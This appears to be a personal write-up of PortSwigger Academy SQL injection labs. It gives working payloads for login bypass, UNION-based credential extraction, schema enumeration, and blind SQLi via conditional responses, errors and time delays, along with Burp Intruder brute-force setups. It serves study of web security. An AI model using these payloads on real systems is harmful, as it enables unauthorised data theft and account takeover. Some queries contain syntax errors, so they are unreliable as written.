# PortSwigger Academy SQL Injection Labs Writeup

- SQLi (SQL Injection) is a web security vulnerability allowing an attacker to interfere with the queries that an application makes to its database.

- Essentially allowing the attacker to retrieve and view data which they are usually not supposed to have access to.

- Data can also be manipulated by the attacker either by modifying, deleting or causing changes to the behavior of the content.

# Impacts of SQLi

- Leakage of personal/private information → passwords, credit card details, personal user info

- Reputation damage to the company and regulatory fines to to be paid

- Potentially allows an attacker to obtain a persistent backdoor and go unnoticed for a long time

<br/>

# Examples of Injection

- **Retrieving hidden data → **modifying SQL query to return additional results

- **Subverting application logic → **changing query to affect the logic of the application

- **UNION attacks → **retrieving data from different database tables

- **Examining the database** → extracting version and structure information about the database

- **Blind SQL Injection → **results of query are not shown in the responses of the application

# SQL Cheatsheet

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

<br/>

## Retrieval of Hidden Data

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

<br/>

![3ca2fe4c_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/494de5f1-5e15-4174-bd3a-a567185f0712)

- **Shopping application that displays products in different categories**

<br/>

<br/>

![cb8ac599_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/0c4ab8bd-afe5-4b88-9364-4634c0612def)

- Filtering for accessories only

<br/>

![63bf6400_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/409a2a8f-e0d4-4236-b6a6-ad0875829db8)

- Using the URL bar to inject the query

- When filtering for a specific product category, the web app makes an SQL query to retrieve all products from the database which are relevant

<br/>

- **Original Query:**


```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

- Based on the query above, the application is vulnerable to SQLi

<br/>

- **Injection in URL Bar**:


```plain text
https://insecure-website.com/products?category=Accessories'--
```

<br/>

**Injected Query:**


```sql
SELECT * FROM products WHERE category = 'Accessories'--' AND released = 1
```

- This comments out the portion of the query where `**released = 1**`** , **therefore displaying all the unreleased products as well.

<br/>

<br/>

![2a79c5c2_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/3cda2c6e-9282-4f1c-8d29-8da01ca82f5e)

- Successful attempt at retrieving hidden data

<br/>

### Example 2:

Instead of just retrieving all items which are released and unreleased from a single category, an attacker can also create another query which allows the attacker to display all items from all categories.

<br/>

**Injection in URL Bar:**


```sql
https://insecure-website.com/products?category=Accessories'+OR+1=1--
```

<br/>

**Full Query:**


```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

<br/>

The query above will essentially check if the category is ‘Accessories’ or `1=1` and comment out the rest of the query where `released = 1` . As a result, this will display items from all categories including those which are unreleased. 

<br/>

![341230e5_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/47485ba4-5676-48dd-b5e3-e03af9a3677a)

- Successful injection attempt at retrieving data from all categories

<br/>

## Lab: SQL injection vulnerability allowing login bypass

<br/>

For instance, a login page with a username and password uses an SQL query to check the credentials by performing an SQL query to authenticate the user.


```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'admin123'
```

<br/>

An attacker can manipulate this type of login query by commenting out the password entirely.

<br/>

**Full Query:**


```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

<br/>

As a result, the query returns the username **administrator** and logs the attacker in as that user.

<br/>

<br/>

![040b5b02_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/5d445465-8010-470f-87f2-ed5ac5bbb043)

![1d312a4c_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/bafe3fad-b039-44f7-b9f5-704609d23ee4)

- **Successfully logged in as Administrator**

<br/>

## Union Attacks

Union attacks allow the attacker to retrieve data from other tables within the database using the **UNION** keyword which allows the attacker to run another **SELECT **query by appending it to the end of the original query.

<br/>

 **Application Query:**


```sql
SELECT name, description FROM products WHERE category = 'Accessories'
```

<br/>

**Modified Query:**


```sql
SELECT name, description FROM products WHERE category = 'Accessories' UNION SELECT username, password from users--
```

Basically, the query will now display all products from the **Accessories** category but will now also display the username and password from the **users **table.

<br/>

### Lab: Determining the number of columns required returned by the query

- Two effective methods to determine how many columns returned from the query

	- ORDER BY

	- UNION SELECT payloads specifying different number of NULL values

<br/>

**ORDER BY**

- Increment the specified column index until an error occurs

- An error indicates that the column index is out of range

- `n-1` upon finding the error for the number of rows

<br/>

- Example: 


```sql
'' ORDER BY 1--
'' ORDER BY 2--
'' ORDER BY 1--
```

<br/>

**UNION SELECT NULL**


```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

- In this case, the number of NULLs will represent the number of columns

- An error will be returned unless the number of NULLs match the number of columns

- *Note: if it’s an Oracle database, specify the table (FROM)**** → e.g. dual***

	- **dual **is dummy table to be used for the purpose of arithmetic operations to be done usually

- The reason for using NULLs is because it is convertible to commonly used data types

<br/>

![1c49ce20_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/234158a8-2f0c-4f6e-afcc-c596173555a6)

- Determining the number of columns using Burp Suite

<br/>

### Lab: Finding a column containing text

- Usually the data to be retrieved will be in string form (such as usernames and password hashes)

- By using the **UNION SELECT NULL** with the number of columns determined, we can swap out one of the **NULL **values with a string to test it

- If an error is returned, then it’s not a string value

<br/>

**SQL Query (assuming there are 4 columns)**


```sql
' UNION SELECT 'a', NULL, NULL, NULL--
' UNION SELECT NULL, 'a', NULL, NULL--
' UNION SELECT NULL, NULL, 'a', NULL--
' UNION SELECT NULL, NULL, NULL, 'a'--
```

<br/>

<br/>

![b60f2fd2_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/9a2b8a48-0274-4928-904b-ba75c29a3d33)

- Determining the column which uses the string data type

<br/>

### Lab: Retrieving data from other tables

- Prerequisite: Determining the table names

- **Query Injected**:


```sql
' UNION SELECT username, password FROM users--
```

<br/>

As a result, the data can be extracted from other tables such as the `**username**`** **and `**password**`** **columns from the `**users**` table in this case.

<br/>

![fbbcb5d6_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/415e6241-9a14-4ad5-b9ae-f68203762ea0)

- Results in **Burp Suite**

<br/>

<br/>

![d6445f3f_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/fd6e7315-7a8a-46a9-b023-d4233f396d8a)

- **Results in the web application**

<br/>

### Lab: Retrieving multiple values within a single column

- Retrieve multiple rows worth by concatenating values together

- `|| '~' ||` represents the delimiter in this case

<br/>

**Sample Query on Oracle Database:**


```sql
''UNION SELECT username || '~' || password FROM users--
```

<br/>

**Query Injected:**


```sql
''UNION SELECT NULL,username ||'~'|| password FROM users--
```

<br/>

![2bf61f8f_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/eae3f982-9f88-4f48-bc52-7cf5289d1ba9)

<br/>

## Examining the Database

### Lab: Querying database type and version (Oracle Database)

- Queries for some popular database types

![e0d789ca_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/8125af47-8b2c-4b62-a4ec-8d2a87253e47)

- `version` represents global variable which consists of the version information of the host

<br/>

![eb27bdbe_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/bb6bd867-2dc6-4001-b67c-b57265ba4f6a)

- Results in **Burp Suite:**

<br/>

![71a04693_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/749120b3-06c6-4764-98b8-45a65a8fc71e)

- Query output displayed in the web application

<br/>

**SQL Query Used:**


```sql
' UNION SELECT banner, NULL FROM v$version ORDER BY 2--
```

<br/>

<br/>

**More information about v$version in Oracle:**

`**v$version**` displays the version number of Oracle Database. The database components have the same version number as the database, so the version number is returned only once.

 | Column | Datatype | Description | 
 | ---- | ---- | ---- | 
 | BANNER | VARCHAR2(80) | Component name and version number | 
 | BANNER_FULL | VARCHAR2(160) | The newline banner format introduced in Oracle Database 18c. The banner displays the database release and version number. | 
 | BANNER_LEGACY | VARCHAR2(80) | The legacy 1 line banner used before Oracle Database 18c. This column displays the same value as the BANNER column | 
 | CON_ID | NUMBER | The ID of the container to which the data pertains. Possible values include:
0: This value is used for rows containing data that pertain to the entire CDB. This value is also used for rows in non-CDBs.
1: This value is used for rows containing data that pertain to only the root
n: Where n is the applicable container ID for the rows containing data | 

<br/>

### Lab: Querying database type and version (MySQL and MSSQL)

<br/>

Similar to Oracle Database, however, it does not require to `**SELECT**`** **from any specific table and the comments are `##` instead of `--`. 

![68f02330_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/7b97dd8c-14af-45a9-a7db-9fa645323b4d)

**SQL Query Injection for MySQL and MSSQL**


```sql
' UNION SELECT @@version##
```

- Output of query via Burp Suite

<br/>

![86764dd1_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/930b41d6-7ddd-4f7b-be98-4b92c18f3234)

- Output of query via the web application

<br/>

**Query Injected:**


```sql
' UNION SELECT @@version,NULL##
```

<br/>

### Lab: Listing Contents of the Database

Most database types (*with the notable exception of ****Oracle***) have a set views called the information schema which provide information about the database.

<br/>

Query `information_schema.tables` to list database tables

**Sample Query:**


```sql
SELECT * FROM information_schema.tables
```

<br/>

<br/>

**Sample Query Output:**

![2de46bdf_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/4514732c-8718-4170-9e1e-b06cc8bee2d4)

Based on the output, there are a total of three tables which are **Products, Users and Feedback. **With this, it is possible to query specific information from the tables. For instance:

<br/>

**Sample Query:**


```sql
SELECT * FROM information_schema.tables WHERE table_name= 'Users'
```

- Query will be used to display all columns within the “Users” table

<br/>

<br/>

### Lab: Listing Information from Database (Not Oracle):

***Note: ****The number of columns and the datatype of the columns must be determined first*

<br/>

Upon determining the number of columns and the datatype of the columns, the first thing to do is list out all tables within the `information_schema` which provides information about the database contents.

<br/>

**Listing all tables within **`information_schema.tables` using **Burp Suite:**  

![3af287aa_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/c88552e5-6f57-45ea-a98a-b545dfc22fa5)

**Query Injected:**


```sql
' UNION SELECT table_name, NULL from information_schema.tables ORDER BY 2--
```

- After listing out all the tables within the database, the one which seemed to be the most relevant was `users_dragfx` for containing user credentials.

<br/>

The `users_dragfx` can then be used to craft a query which is able to list out all the columns within the database.

<br/>

<br/>

![76e89471_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/5e4214e6-7a45-467b-8508-179e5f034467)

**Query Injected:**


```sql
'' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_dragfx'--
```

<br/>

By injecting the queries, there were two columns that seemed to be more relevant than the others when it came to the user credentials. The columns are:

- `username_vubkdl` → usernames

- `password_feplht` → passwords




![86bccc31_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/1d72a6dc-07b3-4342-aa4c-c8c231cf33bb)

**Query Injected:**


```sql
' UNION SELECT username_vubkdl, password_feplht FROM users_dragfx--
```

<br/>

**User Credentials:**

 | **Usernames** | **Passwords** | 
 | ---- | ---- | 
 | administrator | t89xbgj56ldltrxo24mj | 
 | carlos | mgdg1ppgpajf8b1883ax | 
 | wiener | 7klwcouj6w9s43f4guyx | 

<br/>

![e69917df_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/09448a3e-8474-4a30-b175-83d23a9d771b)

- **Successfully logged in as Administrator**

<br/>

<br/>

### Listing Information from Database (Not Oracle) Lab:

<br/>

***Note: ****The number of columns and the datatype of the columns must be determined first*

<br/>

First, we need to start by listing out the tables found in the database.

<br/>

![90f8a783_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/6693822d-c972-4a77-869a-a0efc05f4686)

**Query Injected:**


```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

<br/>

**Output:**

![3460c624_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/7a2d9201-e161-4bd7-97a5-7a54fc5468d6)

- In this case, the most relevant to use is the `USERS_LXUXKC` table which should contain the usernames and passwords of all users.

<br/>

<br/>

![6b5d3ec9_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/8b4ab603-d0ac-4825-9a4b-c95993a9fa06)

**Query Injected:**


```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_LXUXKC'--
```

- The query above essentially displays all the column names within the table named `USERS_LXUXKC`. 

- The two columns that are most likely to contain the user credentials are `USERNAME_DZLIPE` and `PASSWORD_SCZFUD`.

- The column names will be useful when trying to craft query to obtain data from specific columns in the table.

With the the columns obtained, a proper query can be crafted to obtain the user credentials.

<br/>

![10176165_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/36cf202d-a30a-4c5d-be1b-0a5cabc2ebd4)

<br/>

**Query Injected:**


```sql
' UNION SELECT USERNAME_DZLIPE, PASSWORD_SCZFUD FROM USERS_LXUXKC--
```

- The query will essentially extract the `USERNAME_DZLIPE` and `PASSWORD_SCZFUD` columns from the `USERS_LXUXKC`

<br/>

**User Credentials:**

 | **Usernames** | **Passwords** | 
 | ---- | ---- | 
 | administrator | 43kdwuj4rjtg2vua5pl1 | 
 | carlos | yq4r34kvd1p264rilmsc | 
 | wiener | 7u7fy3yx7jvvh2hljqfj | 

<br/>

![c932c1d6_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/453c3e84-6b11-4c01-b97e-a4683fa964f1)

![39cc2bf5_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/b66442aa-5427-4cb7-a9f6-e769175f9c4b)

- **Successfully logged in as Administrator**

<br/>

<br/>

<br/>

## Blind SQL Injection

<br/>

### Lab: Blind SQL injection with conditional responses

<br/>

In this case, the tracking cookie is vulnerable to an SQL injection.

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

<br/>

A request containing a `TrackingId` cookie is processed and along with that the application determines if its a known user using an SQL query.

<br/>

**Sample Query:**


```sql
SELECT TrackingId FROM TrackedUsers WHERE TradckingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Although the query is vulnerable as SQLi, the query results will not be returned to the user. Hence, a blind SQLi injection needs to be performed with its success being determined based on the behaviour of the web application.

<br/>

The lab mentions that there is a “Welcome back” message which will be displayed on the web application depending on query injected. An SQL query can be injected to confirm this.

<br/>

**Query injected:**


```sql
TrackingId=xyz' AND '1'='1--
TrackingId=xyz' AND '1'='2--
```

<br/>

<br/>

![14efc15f_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/3778c2bc-d784-4a39-b4fa-26fe784c4e41)

- “Welcome back” message appears when 1=1 (which is true)

<br/>

<br/>

![07600fc1_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/bad9a0fc-aa02-46f5-a1b7-b2b093c99ce2)

- “Welcome back” message does not appear when 1=2 (which is false)

<br/>

<br/>

![f80194c2_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/a83adb64-db3e-4f42-956b-23b54259affe)

Another verification query needs to be sent to determine if the **users **table exists.

<br/>

**Query injected:**


```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

- Searches for the first record of “a” in the **users **table and confirms it

- `LIMIT 1` in this case ensures that only one is taken into account

<br/>

<br/>

![7a6a42e4_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/853c91bb-023c-45b1-a9d9-1e4e405a30f0)

With the **users** table found, an **administrator **user needs to be determined. In this case, it can be tested by issuing the query below:


```sql
TrackingId=xyz' AND (SELECT 'a' FROM users where username='administrator')='a'--
```

- In this case, it proves that the admin user name is “administrator”

<br/>

<br/>

Next, the password length of the administrator account needs to be determined which can also be done by injecting another query


```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
```

- The query will essentially get the password of the **administrator **account and verify that the length of the password is less than 1.

- The length of the password will be incremented each time until the “Welcome back” message is no longer shown in the response.

- To make this process more efficient **Burp Suite’s Intruder** feature can be used to brute force it

<br/>

![be226917_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/137c09dc-ed05-4525-a0b1-3ca860f319ec)

- Setting intruder attack type and payload positions

<br/>

**Payload Settings:**

![8c467ec9_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/d0d250b5-638a-471c-a216-1a1e35ee2024)

- Payload setting in this case is using a range of numbers from 1 to 30 which increments by 1 each time

<br/>

<br/>

![5186778f_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/ddd87925-ae93-4174-8649-4e6c9a0b2599)

- Grep Match is used with the phrase “Welcome back!” to filter the responses

<br/>

![d8c77375_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/e04327f9-76b7-42ef-b770-cbe760db4892)

- From the brute force attempt, it shows that the password length is a total of 20 characters

- With the number of characters of the password determined, it can finally be brute forced.

<br/>

<br/>

<br/>

![69e7f747_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/8a683159-3926-4a77-916a-f65ca3ce35c4)


```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='a'--
```

- Attack type set is cluster bomb

- The `SUBSTRING` function in SQL  is used to select a specific character position when brute forcing the password in this case

<br/>

<br/>

![5d7d9a13_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/efa26d4f-3733-47ad-99a5-67c0a0ed4530)

- The first payload sets uses a number range of 1 to 20 characters 

<br/>

![204caeed_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/acdc6364-2469-4d52-9f5b-f8bfb253ae19)

- The second payload set includes Alphanumeric payload using lowercase letters only

<br/>

<br/>

![4c54aabd_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/c66b89e2-8be4-4ad0-8280-3e4e1925e5f5)

- **Grep Match **feature is used to specify for the “Welcome back!” phrase in the responses

<br/>

<br/>

![fba26424_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/7c1399f7-a7dd-4417-b7cd-2e2d7131e67f)

- The password brute force results are shown above

- The grep match for “Welcome back!” will be labeled as 1 if it is found within the response

- When ordered correctly, the password is **sgoqvwiuw028xv51cmlx**

<br/>

<br/>

![a183f8f6_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/81926aca-0d53-450a-bfd0-448e2e50d66b)

![5a38369e_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/a0b68684-bb01-44e2-b584-231e70f1c81c)

- **Successfully logged in as Administrator**

<br/>

<br/>

### Lab: Blind SQL with conditional errors

<br/>

**Vulnerability: **TrackingId Cookie is vulnerable to SQL Injections

<br/>

![46c9ac2a_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/e5b5b43e-6e40-4066-b77a-6b761fcf7e09)

- Adding a single quote to the tracking ID to test for syntax errors

- Server error is shown which could potentially indicate a syntax error

<br/>

<br/>

![58226ac3_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/ab210944-77b1-46d7-963e-a75b91aeb3ba)

- Adding quotes to the tracking ID to test for syntax errors

- No error is returned

- Syntax error has been dealt with

- All injections in this case need to be done within the single quotes for this scenario

<br/>

<br/>

![b568d6df_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/0a8bd95b-4e2e-4346-9e2b-4d57a1f30e78)

- Testing if the  server can interpret an SQL query

- Server is, unfortunately, unable to interpret the SQL query

- This could mean that it is an Oracle database which requires a specific table for data to be extracted from

**Query Injected:**


```sql
'|| (SELECT '') ||'
```

<br/>

<br/>

![8ba2cd48_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/db51c222-d4f1-4220-aeb4-7dfef7ea48cc)

- Server can be confirmed to be using **Oracle Database**

**Query Injected:**


```sql
'|| (SELECT * FROM dual) ||'
```

<br/>

<br/>

![c54b1050_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/b5530944-e8cd-4ac6-b6be-44276d6d0a62)

**Query Injected:**


```sql
'|| (SELECT * FROM nothing) ||'
```

- Confirms that data needs to be extracted from a table that exists

- This concludes that is an Oracle Database

<br/>

<br/>

![0bec4d7e_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/97aeb6ea-eaa7-490b-8707-986056cfdc2c)

**Query:**


```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

- Selecting a single entry from the users table

- **ROWNUM = 1** ensures that there is only one row number

![5181bb70_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/ae09521b-c68f-4353-a40a-8fd1a55984a8)

<br/>

<br/>

**Query Injected:**


```sql
'||(SELECT '' FROM users WHERE username='administrator')||'
```

- Selects entries within the users table where the username = ‘administrator’

<br/>

<br/>

![09f8995f_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/3dcb9794-2c01-4bd1-987a-a959a63602db)

**Query Injected:**


```sql
'||(SELECT '' FROM users WHERE username='administratorasdlkfasdf')||'
```

- Supposedly this should not work as that is not the username for the administrator

- Shows that this method of exfiltrating data is unreliable

- Confirms that directly checking for the administrator account is unreliable

<br/>

<br/>

![1794c857_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/a8699a42-f594-42f4-8476-d27c0bf2d299)

**Query:**

- Forcing errors based on conditions to exfiltrate data


```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual||'
```

- When 1=1, it displays a server error which shows that the conditional query worked

- **TO_CHAR(1/0)** is what triggers the error due to the fact that 1 is divided by 0

<br/>

<br/>

![26ca6ca0_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/192dada5-c6a2-428a-bd12-5df602061b5e)

**Query:**


```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- Forcing errors based on conditions to exfiltrate data

- Similar from before but this time the case is “1=2” which is false and hence does not cause an error based on the condition

<br/>

<br/>

![1ccc9e91_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/cf316c22-7dfa-4fab-8e73-504dc42a6269)

**Query Injected:**


```sql
'|| SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Confirming the existence of the “administrator” username

- Query confirms of the existence of the** “administrator” **username within the **users **table

<br/>

<br/>

![432fb3c4_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/abfb0158-1dfd-4dd2-ade3-3ceb4e188983)

**Query Injected:**


```sql
'|| (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Determines the length of the password for the administrator account

- Query injected shows that the administrator password length is more than 1

- Password length needs to be checked incrementally until it does not show an error

- Using **Burp Intruder** will be more efficient

<br/>

<br/>

![9af412dc_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/4c13a606-08df-4324-ad26-1c64a79ef733)

- Sniper attack type is used as only the password length needs to be brute forced first

<br/>

![c78ac19a_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/bd18bf8b-b032-48dd-bfb4-a47c0a933b08)

- The payload set uses a number range of 1 to 30 characters to determine the password length

<br/>

![fca344f8_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/93c30b09-51c9-43c1-9338-ba59937db949)

- Results shows that the password is not more than 20 characters long as it does not return an error after the 20th entry

- Next is to brute force the password incrementally based on the position of each character

<br/>

<br/>

![00d5157e_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/58a00f3c-1bb8-4d60-8784-a588c9104c13)

- **Cluster bomb **attack type is used because there are two parts to brute force consisting of the password position and the character in that position

- **Query:**


```sql
'||SELECT CASE WHEN (SELECT SUBSTRING(password,1,1)='a')) THEN TO_CHAR(1/0) ELSE '' END users where username='administrator'||'
```

<br/>

<br/>

![3eac0098_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/f5ad186a-21cf-4e77-a690-cbcf7f7acdf2)

- Payload set 1 uses a range of numbers from 1 to 20

<br/>

![b042d525_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/7189cc71-ef11-45e8-aa8b-725addce1744)

- Payload set 2 uses lowercase alphanumeric characters for the characters to be brute forced

<br/>

<br/>

![b1e346f9_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/df43c69e-fa20-4514-8eb8-ec37ad658621)

- **Grep-Match **is used in this case to specify for responses containing the phrase** “Internal Server Error”** as it will be an indicator when the character matches the actual password

<br/>

<br/>

![cfadb2cc_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/b5117096-6539-415f-a332-05f127036c32)

- Password for the administrator account was successfully brute forced

- **Full password is q8nwjwj6m10to9c2hp87 **

<br/>

<br/>

![4f5537a0_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/6b62eb7b-9729-4de2-921a-8f5e6d0f5fc0)

![5a10dd10_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/7ed163bf-c7ef-473a-8a64-0ba5c64666b6)

- **Successfully Logged in as Administrator**

<br/>

<br/>

### Lab: Blind SQL with time delays

<br/>

**Time Delay Cheatsheet:**

![dfe8fe01_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/17948b73-c2cf-452e-93e5-63394c127c31)

<br/>

![c612e8ef_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/7a2ada51-bd18-4d26-8b59-34d59c59375d)


**Query Injected:**


```sql
'||pg_sleep(5)--
```

- Testing for time delay on a PostgresSQL server

<br/>

![402e487e_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/49f2b012-4344-4557-a3b4-d8064d2c7848)

- Indicates that it is a **Postgres **database hence why the time delay worked

<br/>

<br/>

<br/>

### Lab: Blind SQL injection with time delays and information retrieval

<br/>

<br/>

![dee64ae3_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/a2d1ea49-3825-45bc-8336-4b735d3430f6)

**Query Injected:**


```sql
; SELECT pg_sleep(10)--
```

- To determine the type of database according to the time delay

- Has 10 second delay indicating that it is a **Postgresco **database

<br/>

<br/>

![a3b1e738_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/532f34e3-e21b-47d2-9d6a-ec63c61c4b27)

![6afd2f34_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/6ce9bc81-679b-46de-a9af-5b8a9a79ac87)

**Query:**


```sql
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

-  Query is used to test for conditions

- Condition whereby** “1=1”** causes time delay for the response to be received

<br/>

<br/>

![de850683_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/99ff3447-46be-42db-aeca-b12a9e5e93c8)


```sql
';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

- To confirming reliability of conditional query

- The query does not result in time delay when** “1=2” **which ensures that it works.

<br/>

<br/>

![2b4f432d_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/f4fb69bf-ccfc-4ed8-b29e-a8f767a1ef8e)

![b2fc61f6_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/64e7d7df-62ca-4e8d-b056-41cf6c6f37d0)


```sql
';SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

- This confirms if the “administrator” username exists within the users table

- There was a time delay which indicates that the “**administrator” **username exists within the **users **table

- Next is to use the **Intruder **to perform a brute force to determine the password length

<br/>

<br/>

![e0c9dac6_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/38e0686a-ff68-4da8-bf0f-13453793508e)

**Query Injected:**


```sql
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

- Attack type is set as Sniper as there is only one payload

- Payload position will be set for the password length which needs to be incremented

<br/>

<br/>

![5006d564_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/f0538cce-ea52-4cab-9d8c-04c7c573fef1)

- Payload used consists of numbers between the range of 1 and 30 with an increment of 1 per request

<br/>

![a244af51_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/c494d496-0e82-474d-80c4-fc9cac0f0f49)

- Resource Pool of 1 for results to be accurate due to the time delay factor which is checked per request

<br/>

<br/>

![cc9305e0_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/a2a97f78-b25a-4111-bfdb-68108e382df4)

- Brute forcing the length of the administrator password

- **Response received** column should be checked to view the time delay

<br/>

![3020f73c_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/897f2c21-7c06-4254-b266-b74a53280735)

**Query:**


```sql
';SELECT CASE WHEN (username = 'administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

- Brute forcing the password length shows that it is 20 characters in length

- With that information, a brute force attack can be done to determine the full password of the administrator account

<br/>

<br/>

![32092687_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/152f7ef5-44a8-4b65-89dd-28abf2f7c205)

**Query Injected for Brute Force:**


```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

